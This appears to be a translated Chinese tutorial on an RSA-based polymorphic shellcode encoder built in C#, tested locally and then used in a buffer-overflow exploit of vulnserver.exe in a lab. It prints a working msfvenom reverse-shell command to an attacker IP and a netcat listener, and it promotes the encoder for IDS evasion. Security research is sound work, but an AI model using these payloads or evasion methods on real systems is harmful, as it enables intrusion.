C＃.Net有一个友好的框架，因此输入的读取易于执行，读取输入到主RichBox中的内容在单行进行，然后在检测到onClick事件时解析和清除：
    string shellcodeOri = richTextBox1.Text.Replace(""","");
    string[] opcodes = shellcodeOri.Split(separadores, System.StringSplitOptions.RemoveEmptyEntries);
可以看到，richbox组件的名称为richBox1：
方法Replace被调用，其包含在空间Text中，并且重载了用于填充新的排列类型字符串（2×2）和将包含要加密的shellcode的间隔符。
另一点要强调的是类型decimal的变量，其表示原始shellcode的大小，即单独表示操作码的对的数目，分配了25的偏移，即多25个位置，以确保解密算法将应用整个shellcode。随后将打印最终字符串：
变量“cifrador”是允许程序决定是否打印密码的指示。其是在程序开始时声明的静态变量：“public static int encryptor;”
且在主程序的加载事件期间被初始化为构造器结构：
    public Form1()
    {
    InitializeComponent();
    usePrime = 3;
    useModule = 256;
    cifrador = 1;
    }
此变量使用值1初始化，因此默认情况下将一次打印一个加密代码，有可能观察到集成if结构的“foreach”。在代码的下一部分中，存在核心功能的主要部分，即每个操作码由指定的素数加密：  
变量“usePrime”是从Form2提取的变量，其指定执行加密要乘以的素数：
    decimal opc = int.Parse(s, System.Globalization.NumberStyles.HexNumber) * usePrime;
正是在这一点上，程序加密每个操作码，最终得到模块：opc =
opc％useModule；变量“useModule”也被导出，结果保存在数组：opcodesInterno []中。
最后打印已经加密的最终字符串，其将在加密代码后立即打印：
打印该链的重点是位置编号11。我们在ASM中的程序创建中进行了回顾，位置11表示要加密的shellcode的大小，因此被替换为操作码10（由于第一个元素为0），如下所示：
    cShellcode[10] = "\x" + tamShellcode.ToHexString().ToString();
以这种方式得出加密主引擎结论。程序还有第二种形式，其允许选择选项并提供给这个程序。套件的功能是使用不同的数字对来加密shellcode，这也包括2个类，其中1个用于生成素数。主类负责收集在主Form中用于加密的数据。以下是第一个类：
前面的代码验证数字是否为素数。类也被声明为静态，以便使用主方法“isPrime”从任何点访问它，如果数字是素数，则返回true，如果不是，则返回false。第二个类是主体，有几个方法，主要的一个允许选择素数，并且通过用前100个素数填充ComboBox来实现：
第二种方法是使用主按钮的onClick事件启动，其负责将选择发送到上述主Form：
程序编译后，结果如下：
我们可以看到，程序将加密代码放在首位，随后是加密的shellcode，有可能直接从文本文件上传程序：
素数的选择必须链接到先前选择的也是素数的数字，两者表示密钥对（公钥和私钥），因此，RSA算法的实现是成功的。程序的主引擎不使用本机Windows
API（因此其从头开始实现转换为十六进制），这个多态性shellcode RSA的套件生成器能够在Linux上运行、能使用wine，这使它具有多平台的能力：
这个版本可以使用了，我们只需要指定我们想要的shellcode、素数对及模块（默认为256），点击“Encode”，最后的链将显示在称为“Shellcode
Encoded”的字段中。此链可以插入一个偏移量为3个空字符的利用代码中，以确保整个shellcode的解密。
**多态 RSA SHELLCODE的本地测试**
在这一点上，我们已经拥有执行第一次本地测试的两个关键点：
1\. 由opcodes表示的加密算法准备好与真正的shellcode工作
2\. 能够非对称加密每个操作码的程序
我们使用没有大小限制的版本进行本地测试。我们将使用以下表示加密的shellcode并加密到32位的字符串：
这是我们将使用的用于查看堆栈的状态的源代码，写在C上：
    int main()
    {
    printf("Shellcode Length: %dn", (int)strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
    }
在编译并加载到GDB之后，以下是堆栈的状态：
可以看到，从地址0到31是解密，然后从33是加密的shellcode，此时不具有任何一致性。为了在shellcode解密后执行完成前查看堆栈的状态，我们将在shellcode加密中在末尾更改操作码的内容。这将导致运行时错误，但我们将获得堆栈的状态。出现该错误之前，预期可以看到彼时shellcode如何被破译，具有shellcode
"wrong"的程序如下：
更改的值为“9A”，程序被编译：
由于所做的更改，其执行不成功，以下显示的是运行二进制文件前的调试会话，注意堆栈有shellcode密码：
二进制被执行，我们可以观察到栈从+38行开始
可以看到，shellcode被成功解密，并停在点81，这正是我们改变操作码来实现这个目的的点，现在只需修正更改的操作码，观察到shell被正确执行：
结果是一个Shell，表示其已经成功地在运行时实现了解密的代码。
**多态性执行的远程测试**
为了演示该算法的完整功能和其在真正脆弱的系统上的实现，首先，我们需要检测有漏洞应用程序，然后执行利用代码。为此，采用了一个称为vulnserver.exe的应用程序服务器，这是一个监听端口9999并在Windows中默认运行的服务器，已在Windows
7中实现，服务器的IP是192.168.1.76，并有 以下选项：
每次服务器接收到连接时，显示已成功建立：
服务器有一个当时被利用的缓冲区溢出。一旦建立连接，将发送最多5000个字符的字符串。为了测试是否充分利用，我们运行以下用python编写脚本：
程序建立连接并发送50000次字符“A”，导致了缓冲区溢出。这在服务器中以以下方式表现：
所以，知道服务器有一个缓冲区溢出后，开发了利用代码，以下是具有正确跳转地址的利用代码：
现在有必要添加将被注入到远程系统的shellcode。这是整个过程的微妙部分。生成shellcode必须遵循基本的攻击规则，这不是在本地执行shell，而是由特定端口在攻击者的机器中接收它。为了实现这一点，我们将使用Kali。重要的是要强调，由于使用反向shell，攻击者机器的IP是非常重要的，在这种情况下，攻击者机器的IP是192.168.1.93，反向shell是防火墙的真正专业实现的示例，其中其阻止不在白名单中的任何其他端口，但忽略了不同端口的绑定，本例中为4444：
这是将要使用的连接类型——反向Shell。以这样的方式，用于生成此类型的shellcode的命令如下：
    root@kali:~# msfvenom -a x86 –platform Windows -p windows/shell_reverse_tcp LHOST=192.168.1.93 LPORT=4444 -e
    x86/shikata_ga_nai -b ‘x00’ -f python
在这一点上要强调的要点是选项-b
x00，其告诉msfvenom的引擎避免这个操作码，因为如果接收到这个操作码，shellcode会突然结束而不继续运行其余的指令。此命令输出特定于此攻击者的shellcode，如下所示：
这个shellcode将被直接复制到exploit中，如下所示：
完成此项后，在运行之前，我们将需要一个服务器监听端口4444。为了接收连接，使用netcat（nc – nvlp
4444）。我们运行利用代码，应该会在netcat的会话中得到一个shell。这是我们运行利用代码之前的会话：
可以观察到，netcat正在监听端口4444，并且利用代码尚未执行，现在，当我们运行利用代码，会发生以下情况：
我们可以看到，利用代码在处于监听状态的会话中没有产生任何错误。我们在具有有漏洞的服务器用户所有者的执行权限的Windows系统上有一个直接shell。可以看到，在Windows会话中硬盘驱动器是C，这表明入侵已成功。服务器状态保持稳定，即尽管有BoF，仍继续正确操作，指示ASM级别没有检测到问题，执行shellcode并将其发送到指定端口指定的IP地址：
这表明远程Windows利用代码是完全成功的。
现在我们有了在利用代码中测试RSA非对称算法加密的所有元素。此时，现在唯一要做的是使用具有数字3和171的加密程序，并将其放入利用代码中。现在我们将加密原始的shellcode：
完成此项后，我们将具有加密的shellcode的最终字符串复制到最终利用代码中：
    expl.send(buffer)
    expl.close()
可以观察到，操作码不表示入侵检测系统（IDS / IPS）的任何东西，是不相干的操作码，因为其被加密了。以下是执行之前和之后：
表示加密或解密的操作码，加密的操作码被分离。将根据在解密的程序中指定的跳跃来保存地址，以获得堆栈的增长和EIP的存储器中的位置：
解释上面的内容后，我们将展示执行具有非对称多态Shellcode的利用代码前的会话：
服务器正在运行和调试：
现在让我们执行远程利用代码。预期的结果正是，在堆栈中运行时解码每个操作码之后，获得反向shell：
执行成功，我们可以看到，代表利用代码的脚本的顶部已经被执行，在Netcat会话中，成功地从被攻破的机器接收到远程shell。我们可以在Linux会话上看到硬盘驱动器上的标签，除了一个简单和正常的连接之外，服务器没有注意到任何异常：
由此证明了算法作为应用程序的功能，其能够使用RSA加密来对操作码进行加密，这产生多态非对称shellcode——可在本地和远程利用代码中使用。
**结论**
本文介绍了用于加密shellcode的RSA算法、其在实际利用代码中的使用、代表前述算法的操作码的优化及用于加密的程序，我们得出的结论是，基于获得的和证明的结果，其提供了该建议的有效性的优异结果。基于RSA算法的多态性根本不影响注入到利用代码的恶意有效载荷的最终执行，IDS根本无法检测到它。
要强调的一个重要方面是，本研究的重点完全是攻击性的，但内在的、附带的结果是防御。加密算法还可以用于测试IDS或IPS，因此提供了一种以理想情况下入侵者所采用的方式执行测试的工具（修改利用代码和完成shellcoding）。
我们得出的另外一个结论是，这不仅开发了一种用于零日攻击和逃避NIDS的算法和工具，还提供了一种可以考虑的防御方法及相应的测试环境。